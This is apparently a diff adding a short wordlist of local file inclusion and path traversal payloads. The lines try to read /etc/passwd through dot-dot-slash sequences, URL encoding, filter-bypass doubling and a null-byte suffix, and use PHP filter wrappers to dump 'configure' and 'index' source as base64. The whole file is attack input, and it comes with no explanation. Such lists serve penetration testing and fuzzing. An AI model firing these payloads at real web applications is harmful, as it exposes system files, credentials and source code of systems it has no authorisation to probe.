@@ -1,0 +1,11 @@
+RANDOMFILE.txt
+/etc/passwd
+../../../../etc/passwd
+/../../../etc/passwd
+./languages/../../../../etc/passwd
+....//....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+../../../../etc/passwd%00
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/read=convert.base64-encode/resource=configure
+php://filter/read=convert.base64-encode/resource=index
